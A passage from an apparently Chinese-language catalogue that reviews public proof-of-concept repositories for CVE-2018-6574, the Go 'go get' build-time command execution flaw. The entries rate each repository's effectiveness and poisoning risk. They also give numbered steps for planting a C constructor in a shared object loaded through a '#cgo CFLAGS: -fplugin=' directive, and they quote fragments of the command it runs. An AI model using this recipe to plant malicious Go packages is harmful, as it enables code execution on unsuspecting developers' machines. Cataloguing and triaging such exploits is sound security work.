CVE-2018-6574 允许在源码构建过程中利用 gcc 或 clang 插件特性执行远程命令。漏洞原因是 Go 在执行 `go get` 时没有正确阻止 `-fplugin=` 和 `-plugin=` 参数。 

**有效性:**

提供的 POC 代码有效。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 在程序启动时自动执行 `/usr/local/bin/score 5406e228-19be-4c56-b6da-ee36ce3dee1a` 命令。`main.go` 文件使用 `cgo` 调用 `attack.so` (由 `attack.c` 编译而来)，从而触发恶意代码执行。

**投毒风险:**

提供的代码中没有明显的投毒代码。`attack.c` 的功能很明确，就是执行一个固定的命令。`main.go` 只是为了触发 `attack.c` 中恶意函数的执行。因此，投毒风险评估为 0%。

**利用方式:**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 包含在程序启动时执行任意命令的代码。
3.  `main.go` 利用 `cgo` 技术，通过 `-fplugin=` 选项加载并执行 `attack.c` 编译后的共享库。
4.  攻击者将该恶意 Go 包托管在可访问的存储库中。
5.  受害者在易受攻击的 Go 版本上使用 `go get` 命令下载并构建该恶意包。
6.  构建过程中，`attack.so` 被加载，其中的恶意代码被执行，导致远程命令执行。
7.  `/usr/local/bin/score` 命令被执行，可能导致系统受损或被控制。

**项目地址:** [the-valluvarsploit/CVE-2018-6574](https://github.com/the-valluvarsploit/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #32

**来源**: [CVE-2018-6574-tjcim_cve-2018-6574.md](../2018/CVE-2018-6574-tjcim_cve-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本，并通过`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源代码构建期间执行远程命令。这是因为 Go 在处理 gcc 或 clang 插件功能时，未阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的 Go 包，该代码利用这些参数在构建时执行任意命令。提供的 POC 代码通过创建一个共享对象 (`attack.so`)，其中包含一个在加载时执行 `sleep 10` 命令的构造函数。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，在构建时加载该共享对象，从而触发恶意代码的执行。漏洞利用方式是诱使用户使用易受攻击的 Go 版本 `go get` 命令下载并构建包含恶意 `#cgo` 指令的包。由于POC代码明确定义了执行的命令和利用方式，没有发现隐藏的恶意代码，因此投毒风险评估为0%。

**项目地址:** [tjcim/cve-2018-6574](https://github.com/tjcim/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #33

**来源**: [CVE-2018-6574-yavolo_CVE-2018-6574.md](../2018/CVE-2018-6574-yavolo_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响版本的Go执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 漏洞允许攻击者在用户使用 `go get` 命令下载和构建包含恶意代码的Go包时，执行任意命令。该漏洞是由于 Go 在构建过程中没有正确阻止 `-fplugin=` 和 `-plugin=` 参数传递给 gcc 或 clang 编译器造成的。攻击者可以创建一个包含恶意 C 代码的 Go 包，并利用 `// #cgo CFLAGS:` 指令将恶意代码编译成共享库，然后在构建过程中执行。 

**有效性：** 提供的PoC代码是有效的。其中 `a.c` 文件包含恶意C代码，该代码在编译成动态链接库 (`a.so`) 后，会被 `main.go` 文件中的 `// #cgo CFLAGS: -fplugin=./a.so` 指令加载并在构建过程中执行。`a.c` 中的代码 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 会执行任意系统命令。

**投毒风险：** 此处 `a.c` 中执行 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 可以视作 PoC的一部分，用于证明漏洞存在，但同时也存在一定的投毒风险。开发者可能隐藏其他恶意代码，例如窃取用户凭据或安装后门。由于`score`命令指向位置未知,可能存在更大的风险.

**利用方式：**

1.  **创建恶意Go包：** 攻击者创建一个包含 `a.c` 和 `main.go` 文件的恶意Go包。
2.  **植入恶意C代码：** 在 `a.c` 文件中编写要执行的恶意C代码。PoC中为执行特定的命令。
3.  **CGO指令：** 在 `main.go` 文件中使用 `// #cgo CFLAGS: -fplugin=./a.so` 指令，指示 Go 编译器在构建过程中加载并执行恶意共享库。
4.  **诱骗用户安装：** 攻击者将恶意Go包上传到公共代码仓库或通过其他方式诱骗用户使用 `go get` 命令下载和构建该包。
5.  **执行恶意代码：** 当用户使用 `go get` 命令构建恶意包时，恶意C代码将被编译成共享库并执行，从而导致远程命令执行。

**项目地址:** [yavolo/CVE-2018-6574](https://github.com/yavolo/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---



---



---



---



---



---



---



---

